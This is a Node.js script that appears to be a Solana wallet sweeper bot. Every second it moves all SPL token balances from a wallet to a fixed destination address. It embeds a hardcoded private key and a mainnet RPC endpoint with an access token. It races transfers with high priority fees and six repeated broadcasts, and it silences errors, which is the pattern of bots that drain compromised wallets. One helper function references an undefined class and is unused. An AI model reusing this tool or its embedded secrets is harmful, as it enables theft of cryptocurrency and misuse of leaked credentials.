import { Connection, PublicKey, Keypair, Transaction, SystemProgram, sendAndConfirmTransaction, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddressSync, createAssociatedTokenAccountInstruction, createTransferInstruction, TOKEN_PROGRAM_ID } from '@solana/spl-token';
import fs from 'fs';
import bs58 from 'bs58';

// Set up the Solana connection with QuickNode endpoints
const SOLANA_RPC_URL = 'https://virulent-greatest-mountain.solana-mainnet.quiknode.pro/01e6855e8c30948eb8b5b4aac9b70781d123cc04';
const WS_ENDPOINT = 'wss://virulent-greatest-mountain.solana-mainnet.quiknode.pro/01e6855e8c30948eb8b5b4aac9b70781d123cc04';

const connection = new Connection(SOLANA_RPC_URL, {   
  commitment: 'confirmed',
  confirmTransactionInitialTimeout: 60000
});  
  
// Set up the monitored wallet keypair  
const monitoredWalletPrivateKey = 'd69ea9a6df5f7fa1bed5dafa0489d211cd5b2244bab52ee7fd82bb28a65cf72ee183247aa0b605e39346f1ece33d839544127d969300bf8f0a4759ac5a3b2ade';  
const monitoredWalletKeypair = Keypair.fromSecretKey(Uint8Array.from(Buffer.from(monitoredWalletPrivateKey, 'hex')));  
const monitoredWalletPublicKey = monitoredWalletKeypair.publicKey;  
  
// Set up the destination wallet public key  
const destinationWalletPublicKey = new PublicKey('BdAnwkVsJd2McJ3cbwzA1pzbzJrK9XrNwmdJVUof1WWw');  
  
// Function to get the SPL token balance of a wallet  
async function getSplTokenBalance(walletPublicKey, tokenMintPublicKey) {  
  const token = new Token(connection, tokenMintPublicKey, TOKEN_PROGRAM_ID, walletPublicKey);  
  const balance = await token.getBalance();  
  return balance;  
}  
  
// Function to send SPL tokens from one wallet to another  
async function sendSplTokens(sourceKeypair, destinationPublicKey, tokenMintPublicKey, amount) {  
  try {
    const sourceATA = getAssociatedTokenAddressSync(
      tokenMintPublicKey,
      sourceKeypair.publicKey,
      false,
      TOKEN_PROGRAM_ID
    );

    const destinationATA = getAssociatedTokenAddressSync(
      tokenMintPublicKey,
      destinationPublicKey,
      false,
      TOKEN_PROGRAM_ID
    );

    // Quick balance check
    const sourceBalance = await connection.getTokenAccountBalance(sourceATA);
    if (parseInt(sourceBalance.value.amount) === 0) return null;

    const transaction = new Transaction();
    
    // Get fresh blockhash first
    const latestBlockhash = await connection.getLatestBlockhash('confirmed');
    transaction.recentBlockhash = latestBlockhash.blockhash;
    transaction.feePayer = sourceKeypair.publicKey;

    // First instruction: priority fees
    transaction.add(
      ComputeBudgetProgram.setComputeUnitPrice({
        microLamports: 100000
      })
    );

    // Check if destination ATA exists, if not create it
    try {
      await connection.getTokenAccountBalance(destinationATA);
    } catch {
      console.log('Creating destination token account...');
      transaction.add(
        createAssociatedTokenAccountInstruction(
          sourceKeypair.publicKey,
          destinationATA,
          destinationPublicKey,
          tokenMintPublicKey
        )
      );
    }

    // Last instruction: transfer
    transaction.add(
      createTransferInstruction(
        sourceATA,
        destinationATA,
        sourceKeypair.publicKey,
        amount
      )
    );

    // Sign and serialize
    transaction.sign(sourceKeypair);
    const rawTransaction = transaction.serialize();
    
    // Send multiple times
    const sendPromises = Array(6).fill().map(() => 
      connection.sendRawTransaction(rawTransaction, {
        skipPreflight: true,
        maxRetries: 5,
        preflightCommitment: 'processed'
      })
    );

    try {
      const signatures = await Promise.allSettled(sendPromises);
      const validSignature = signatures.find(r => r.status === 'fulfilled')?.value;
      
      if (validSignature) {
        console.log(`Sent tx: ${validSignature.slice(0, 8)}... | Solscan: https://solscan.io/tx/${validSignature}`);
        return validSignature;
      }
    } catch (error) {
      // Silently handle transaction errors
      return null;
    }

    return null;

  } catch (error) {
    // Only log non-transaction related errors, and keep running
    if (!error.toString().includes('transaction fees') && 
        !error.toString().includes('getTokenAccountBalance') &&
        !error.toString().includes('simulation failed')) {
      console.log('Wallet temporarily unavailable - continuing to monitor...');
    }
    return null;
  }
}  
  
// Add a lock flag at the top of the file
let isProcessing = false;

async function checkAndSendSplTokens(sourceKeypair, destinationPublicKey) {
  try {
    console.log(`Checking wallet: ${sourceKeypair.publicKey.toString()}`);
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
      sourceKeypair.publicKey,
      { programId: TOKEN_PROGRAM_ID }
    );

    console.log(`Found ${tokenAccounts.value.length} total token accounts`);
    const nonZeroAccounts = tokenAccounts.value.filter(
      account => account.account.data.parsed.info.tokenAmount.uiAmount > 0
    );
    console.log(`Processing ${nonZeroAccounts.length} accounts with non-zero balances`);

    for (const tokenAccount of nonZeroAccounts) {
      try {
        const mintAddress = tokenAccount.account.data.parsed.info.mint;
        const balance = parseInt(tokenAccount.account.data.parsed.info.tokenAmount.amount);
        
        console.log(`Found token: ${mintAddress} with balance: ${balance}`);
        
        const result = await sendSplTokens(
          sourceKeypair,
          destinationPublicKey,
          new PublicKey(mintAddress),
          balance
        );

        if (result) {
          console.log(`Successfully processed token ${mintAddress}`);
        }
        
        // Add delay between tokens
        await new Promise(resolve => setTimeout(resolve, 2000));
      } catch (error) {
        console.error('Error processing token:', error);
        // Continue with next token even if one fails
        continue;
      }
    }
  } catch (error) {
    console.error('Error in checkAndSendSplTokens:', error);
  }
}

// Main loop continues running regardless of errors
async function main() {
  console.log('Starting token monitor...');
  
  while (true) {
    try {
      await checkAndSendSplTokens(monitoredWalletKeypair, destinationWalletPublicKey);
    } catch (error) {
      // Silently continue on any error
    }
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
}

// Run the main function
console.log('Initializing monitor...');
main().catch(console.error);
